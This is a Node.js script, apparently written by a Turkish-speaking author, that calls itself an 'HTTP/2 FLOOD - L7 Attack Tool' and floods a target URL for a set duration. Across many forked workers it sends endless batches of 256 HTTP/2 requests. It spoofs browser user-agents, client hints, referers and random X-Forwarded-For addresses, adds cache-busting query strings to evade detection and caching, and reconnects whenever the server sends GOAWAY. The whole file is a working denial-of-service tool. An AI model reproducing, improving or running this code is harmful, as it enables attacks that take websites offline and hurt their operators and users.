const http2 = require('http2');
const cluster = require('cluster');
const url = require('url');
const tls = require('tls');
const crypto = require('crypto');


if (process.argv.length < 4) {
    console.log("Kullanım: node script.js <target> <thread> <time>");
    console.log("Örnek: node script.js https://example.com 8 100");
    process.exit(1);
}

const target = process.argv[2];
const threads = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

const parsed = url.parse(target);


const browserPool = [
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="99"' },
    { ua: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="132", "Google Chrome";v="132"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="131", "Google Chrome";v="131"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "macOS", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", platform: "macOS", mobile: "?0", ch: '"Google Chrome";v="123"' },
    { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "Linux", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", platform: "Windows", mobile: "?0", ch: "" },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0", platform: "Windows", mobile: "?0", ch: "" },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0", platform: "Windows", mobile: "?0", ch: "" },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.2; rv:135.0) Gecko/20100101 Firefox/135.0", platform: "macOS", mobile: "?0", ch: "" },
    { ua: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0", platform: "Linux", mobile: "?0", ch: "" },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0", platform: "Windows", mobile: "?0", ch: '"Chromium";v="133", "Microsoft Edge";v="133"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15", platform: "macOS", mobile: "?0", ch: "" },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", platform: "macOS", mobile: "?0", ch: "" },
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: "" },
    { ua: "Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.54 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Google Chrome";v="132"' },
    { ua: "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: "" }
];

const referers = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://yandex.com.tr/", "https://www.reddit.com/", "https://t.co/",
    "https://www.facebook.com/", "https://www.instagram.com/"
];

const langHeaders = ["tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9", "en-GB,en;q=0.9", "de-DE,de;q=0.9"];
const encodingHeaders = ["gzip, deflate, br, zstd", "gzip, deflate, br", "gzip, deflate"];
const cacheControls = ["max-age=0", "no-cache", "no-store, must-revalidate"];

function randstr(len) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let r = "";
    for (let i = 0; i < len; i++) r += chars[Math.floor(Math.random() * chars.length)];
    return r;
}

function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

let _nowCache = Date.now();
setInterval(() => { _nowCache = Date.now(); }, 10);


let stats = {
    '200': 0,
    '403': 0,
    '503': 0,
    'other': 0,
    'requests': 0,
    'startTime': Date.now()
};

if (cluster.isMaster) {
    console.clear();
    console.log('━'.repeat(60));
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║           HTTP/2 FLOOD - L7 Attack Tool               ║');
    console.log('╚════════════════════════════════════════════════════════╝');
    console.log(`Target  : ${target}`);
    console.log(`Threads : ${threads}`);
    console.log(`Duration: ${duration}s`);
    console.log(`Mode    : Proxyless`);
    console.log('━'.repeat(60));
    
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }


    const statsInterval = setInterval(() => {
        const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
        const rps = Math.floor(stats.requests / elapsed);
        
        process.stdout.write('\r\x1b[K');
        process.stdout.write(
            `[${elapsed}s] ` +
            `RPS: \x1b[32m${rps}\x1b[0m | ` +
            `Total: \x1b[36m${stats.requests}\x1b[0m | ` +
            `200: \x1b[32m${stats['200']}\x1b[0m | ` +
            `403: \x1b[33m${stats['403']}\x1b[0m | ` +
            `503: \x1b[31m${stats['503']}\x1b[0m | ` +
            `Other: ${stats['other']}`
        );
    }, 100);

    cluster.on('message', (worker, message) => {
        if (message.type === 'stats') {
            stats['200'] += message.data['200'] || 0;
            stats['403'] += message.data['403'] || 0;
            stats['503'] += message.data['503'] || 0;
            stats['other'] += message.data['other'] || 0;
            stats['requests'] += message.data['requests'] || 0;
        }
    });

    cluster.on('exit', (worker) => {

        if (Date.now() - stats.startTime < duration * 1000) {
            cluster.fork();
        }
    });

    setTimeout(() => {
        clearInterval(statsInterval);
        console.log('\n\n━'.repeat(60));
        console.log('Saldırı tamamlandı!');
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        setTimeout(() => process.exit(0), 1000);
    }, duration * 1000);

} else {
    let workerStats = {
        '200': 0,
        '403': 0,
        '503': 0,
        'other': 0,
        'requests': 0
    };

    process.on('uncaughtException', (e) => {});
    process.on('unhandledRejection', (e) => {});


    function runFlooder() {
        const browser = pick(browserPool);
        let isGoingAway = false;

        const client = http2.connect(target, {
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 2147483647,
                maxFrameSize: 16384,
                maxHeaderListSize: 262144,
                maxConcurrentStreams: 32768
            },
            rejectUnauthorized: false
        });

        client.on('error', () => {
            try { client.close(); } catch(e) {}
        });

        client.on('goaway', () => {
            isGoingAway = true;
            setImmediate(() => {
                try { client.close(); } catch(e) {}
                runFlooder(); 
            });
        });

        client.on('connect', () => {

            const pingTimer = setInterval(() => {
                if (!client.destroyed && !isGoingAway) {
                    try { client.ping(() => {}); } catch(e) {}
                }
            }, 5000);


            function sendBatchRequests() {
                if (client.destroyed || isGoingAway) {
                    clearInterval(pingTimer);
                    return;
                }

                const now = _nowCache;
                const host = parsed.host;
                const pathname = parsed.pathname || '/';


                for (let i = 0; i < 256; i++) {
                    if (client.destroyed || isGoingAway) break;

                    const ref = pick(referers);
                    const cb = randstr(6);
                    const qs = `?cb=${cb}&t=${now}&r=${randstr(4)}`;
                    const finalPath = pathname + (pathname.includes('?') ? '&' + qs.slice(1) : qs);

                    const headers = {
                        ':method': 'GET',
                        ':authority': host,
                        ':scheme': 'https',
                        ':path': finalPath,
                        'user-agent': browser.ua,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'accept-language': pick(langHeaders),
                        'accept-encoding': pick(encodingHeaders),
                        'cache-control': pick(cacheControls),
                        'pragma': 'no-cache',
                        'referer': ref,
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': ref.includes(host) ? 'same-origin' : 'cross-site',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'x-forwarded-for': `${randInt(1,255)}.${randInt(0,255)}.${randInt(0,255)}.${randInt(0,255)}`
                    };


                    if (browser.ch && browser.ch.length > 0 && !browser.ua.includes('Firefox') && !browser.ua.includes('Safari/605')) {
                        headers['sec-ch-ua'] = browser.ch;
                        headers['sec-ch-ua-mobile'] = browser.mobile;
                        headers['sec-ch-ua-platform'] = `"${browser.platform}"`;
                    }

                    try {
                        const req = client.request(headers);
                        workerStats['requests']++;

                        req.on('response', (resHeaders) => {
                            const status = resHeaders[':status'];
                            if (status === 200) workerStats['200']++;
                            else if (status === 403) workerStats['403']++;
                            else if (status === 503) workerStats['503']++;
                            else workerStats['other']++;
                            req.close();
                            req.destroy();
                        });

                        req.on('error', () => req.destroy());
                        req.end();
                    } catch (e) { break; }
                }


                setImmediate(sendBatchRequests);
            }

            sendBatchRequests();


            setTimeout(() => {
                clearInterval(pingTimer);
                try { client.close(); } catch(e) {}
                if (!isGoingAway) runFlooder();
            }, 20000);
        });
    }


    const FLOODERS = 50;
    for (let i = 0; i < FLOODERS; i++) {
        setInterval(runFlooder, 1);
    }


    setInterval(() => {
        if (process.connected) {
            try {
                process.send({ type: 'stats', data: workerStats });
                workerStats = {
                    '200': 0,
                    '403': 0,
                    '503': 0,
                    'other': 0,
                    'requests': 0
                };
            } catch(e) {}
        }
    }, 500);
}